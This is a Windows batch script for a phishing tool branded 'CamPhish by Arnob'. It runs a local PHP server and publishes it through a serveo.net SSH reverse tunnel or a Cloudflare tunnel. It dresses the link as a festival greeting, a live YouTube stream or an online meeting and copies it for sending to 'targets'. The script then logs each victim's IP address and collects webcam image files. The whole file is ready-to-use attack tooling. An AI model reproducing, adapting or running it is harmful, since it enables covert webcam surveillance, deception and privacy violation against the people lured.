@echo off
title CAMPHISH BY ARNOB
if not exist php (
echo Dependencies are not installed. Instal it by running "setup-camphish.bat"
pause
exit
)
set php=%cd%\php\php.exe
set cloudflare=%cd%\cloudflare.exe
cd templates
if exist cloudflraeoutput.txt del cloudflraeoutput.txt
if exist link.txt del link.txt
if exist index.php del index.php
if exist ip.txt del ip.txt
if exist index2.html del index2.html
if exist Log.log del Log.log
rem cd .. 
rem set php=%cd%/php/php.exe
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do     rem"') do (
  set "DEL=%%a"
)
:top
cls
echo [1;92m _______  _______  _______  [1;97m_______          _________ _______          [0m
echo [1;92m(  ____ \(  ___  )(       )[1;97m(  ____ )^|\     /^|\__   __/(  ____ \^|\     /^|[0m
echo [1;92m^| (    \/^| (   ) ^|^| () () ^|[1;97m^| (    )^|^| )   ( ^|   ) (   ^| (    \/^| )   ( ^|[0m
echo [1;92m^| ^|      ^| (___) ^|^| ^|^| ^|^| ^|[1;97m^| (____)^|^| (___) ^|   ^| ^|   ^| (_____ ^| (___) ^|[0m
echo [1;92m^| ^|      ^|  ___  ^|^| ^|(_)^| ^|[1;97m^|  _____)^|  ___  ^|   ^| ^|   (_____  )^|  ___  ^|[0m
echo [1;92m^| ^|      ^| (   ) ^|^| ^|   ^| ^|[1;97m^| (      ^| (   ) ^|   ^| ^|         ) ^|^| (   ) ^|[0m
echo [1;92m^| (____/\^| )   ( ^|^| )   ( ^|[1;97m^| )      ^| )   ( ^|___) (___/\____) ^|^| )   ( ^|[0m
echo [1;92m(_______/^|/     \^|^|/     \^|[1;97m^|/       ^|/     \^|\_______/\_______)^|/     \^|[0m
echo.
echo.
echo -----Choose tunnel server----
echo.
echo [1;92m[[1;97m01[1;92m][1;93m Serveo.net[0m
echo [1;92m[[1;97m02[1;92m][1;93m Cloudflare[0m
echo.
set servar=1
set /p servar=[1;92m[[1;97m+[1;92m][1;92m Choose a port Forwarding option: [Default is 1] [0m
if "%servar%" == "1" ( set link-gen=serveo
) else if "%servar%" == "2" (set link-gen=cloudflare
) else (
echo [1;92m[!] Invalid option![0m
pause
goto top
)
echo.
echo -----Choose a template----
echo.
echo [1;92m[[1;97m01[1;92m][1;93m Festival Wishing[0m
echo [1;92m[[1;97m02[1;92m][1;93m Live Youtube TV[0m
echo [1;92m[[1;97m03[1;92m][1;93m Online Meeting[0m
echo.
set input=1
set /p input=[1;92m[[1;97m+[1;92m][1;92m Choose a template: [Default is 1] [0m
       if "%input%" == "2" (
	   goto :liveyt
	   ) else if %input% == 2 (
	   goto :liveyt
	   ) else if %input% == 1 (
	   goto :fw
	   ) else if %input% == 3 (
	   goto :om
	   ) else (
	   echo [1;92m[!] Invalid template option! try again[0m
	   pause
	   goto top
	   )



:checkfound
echo.
echo [1;92m[[1;97m*[1;92m] Waiting targets,[1;97m Press Ctrl + C to exit...[0m
set count1=1
goto loop
:loop
if exist ip.txt (
if %count1% == 1 (
echo.
echo [1;92m[[97m+[1;92m][1;92m Target opened the link![0m
set count1=2
rem Ip cathick code.
for /f "tokens=2 delims=:" %%a in ('type "ip.txt" ^| findstr /b /c:"IP:"') do (
    echo [1;33m[[1;97m+[1;93m] IP:[1;97m%%a[0m   
)
rem done
type ip.txt >> saved.ip.txt
del ip.txt
)
)
if exist Log.log (
echo.
echo [1;92m[[97m+[1;92m][1;92m Cam file received![0m
del Log.log
goto loop2
)
goto loop
:loop2
rem for %%F in ("%cd%\*.png") do (
rem     if not defined files[%%~nxF] (
rem         set files[%%~nxF]=1
rem         echo Cam file recieved: %%~nxF
rem     )
rem )
if exist Log.log (
echo.
echo [1;92m[[97m+[1;92m][1;92m Cam file received![0m
del Log.log
timeout /t 1 >nul
goto loop2
)


goto loop2
:liveyt
echo.
set /p yt_vid_id=[1;92m[[1;97m+[1;92m][1;92m Enter YouTube video watch ID: [0m
set rdl=liveyt2
call :php-start
goto %link-gen%
:liveyt2
rem powershell -Command "(gc LiveYTTV.html) -replace 'forwarding_link', '%link%' | Out-File -encoding ASCII index3.html"
rem (for /f "usebackq delims=" %%A in ("LiveYTTV.html") do (
rem     echo %%A | findstr /v "^$" | find /v "forwarding_link" || echo %link%
rem )) > "index3.html"
setlocal enabledelayedexpansion
> "index3.html" (
    for /f "usebackq delims=" %%a in ("LiveYTTV.html") do (
        set "line=%%a"
        set "line=!line:forwarding_link=%link%!"
        echo !line!
    )
)
endlocal
timeout /t 1 >nul
rem powershell -Command "(gc index3.html) -replace 'live_yt_tv', '%yt_vid_id%' | Out-File -encoding ASCII index2.html"
rem (for /f "usebackq delims=" %%A in ("index3.html") do (
rem     echo %%A | findstr /v "^$" | find /v "live_yt_tv" || echo %yt_vid_id%
rem )) > "index2.html"
setlocal enabledelayedexpansion
> "index2.html" (
    for /f "usebackq delims=" %%a in ("index3.html") do (
        set "line=%%a"
        set "line=!line:live_yt_tv=%yt_vid_id%!"
        echo !line!
    )
)
endlocal
del index3.html
echo [1;92m[[1;97m*[1;92m][1;92m Direct link: [0m%link%
echo %link% | clip
goto checkfound
:om
set rdl=om2
call :php-start
goto %link-gen%
:om2
rem powershell -Command "(gc OnlineMeeting.html) -replace 'forwarding_link', '%link%' | Out-File -encoding ASCII index2.html"
setlocal enabledelayedexpansion
> "index2.html" (
    for /f "usebackq delims=" %%a in ("OnlineMeeting.html") do (
        set "line=%%a"
        set "line=!line:forwarding_link=%link%!"
        echo !line!
    )
)
endlocal
echo [1;92m[[1;97m*[1;92m][1;92m Direct link: [0m%link%
echo %link% | clip
goto checkfound
:fw
echo.
set /p fes-name=[1;92m[[1;97m+[1;92m][1;92m Enter festival name: [0m
set rdl=fw2
call :php-start
goto %link-gen%
:fw2
rem powershell -Command "(gc festivalwishes.html) -replace 'forwarding_link', '%link%' | Out-File -encoding ASCII index3.html"
setlocal enabledelayedexpansion
> "index3.html" (
    for /f "usebackq delims=" %%a in ("festivalwishes.html") do (
        set "line=%%a"
        set "line=!line:forwarding_link=%link%!"
        echo !line!
    )
)
endlocal
timeout /t 1 >nul
rem powershell -Command "(gc index3.html) -replace 'fes_name', '%fes-name%' | Out-File -encoding ASCII index2.html"
setlocal enabledelayedexpansion
> "index2.html" (
    for /f "usebackq delims=" %%a in ("index3.html") do (
        set "line=%%a"
        set "line=!line:fes_name=%fes-name%!"
        echo !line!
    )
)
endlocal
del index3.html
echo [1;92m[[1;97m*[1;92m][1;92m Direct link: [0m%link%
echo %link% | clip
goto checkfound
:serveo
rem cd ..
echo [1;92m[[97m+[1;92m][1;92m Starting Serveo...[0m
rem start /b "" ssh -R :80:localhost:3333 serveo.net >> link.txt
start /b "" ssh -R 80:localhost:3333 serveo.net > link.txt
timeout 10 >nul
for /f "tokens=5 delims= " %%a in ('type link.txt') do set link=%%a
rem powershell -Command "(gc templates.php) -replace 'forward_link', '%link%' | Out-File -encoding ASCII index.php"
rem (for /f "usebackq delims=" %%A in ("templates.php") do (
rem     echo %%A | findstr /v "^$" | find /v "forwarding_link" || echo %link%
rem )) > "index.php"
rem if exist link.txt del link.txt
setlocal enabledelayedexpansion
> "index.php" (
    for /f "usebackq delims=" %%a in ("templates.php") do (
        set "line=%%a"
        set "line=!line:forward_link=%link%!"
        echo !line!
    )
)
endlocal
title CAMPHISH BY ARNOB
goto %rdl%

:cloudflare
echo [1;92m[[97m+[1;92m][1;92m Starting Cloudflare...[0m
start /b "" %cloudflare% tunnel --url localhost:3333 >cloudflraeoutput.txt 2>&1
timeout 10 >nul
type cloudflraeoutput.txt | find "https" >link.txt
for /f "tokens=4 delims= " %%a in ('type link.txt ^| find "|"') do set link=%%a
del link.txt
setlocal enabledelayedexpansion
> "index.php" (
    for /f "usebackq delims=" %%a in ("templates.php") do (
        set "line=%%a"
        set "line=!line:forward_link=%link%!"
        echo !line!
    )
)
endlocal
goto %rdl%

:php-start
echo.
echo [1;92m[[97m+[1;92m][1;92m Starting php server...[0m
start /b "" "%php%" -S localhost:3333 -t "%cd%" >nul 2>&1
timeout 3 >nul
goto :eof

















:colorEcho
echo off
<nul set /p ".=%DEL%" > "%~2"
findstr /v /a:%1 /R "^$" "%~2" nul
del "%~2" > nul 2>&1i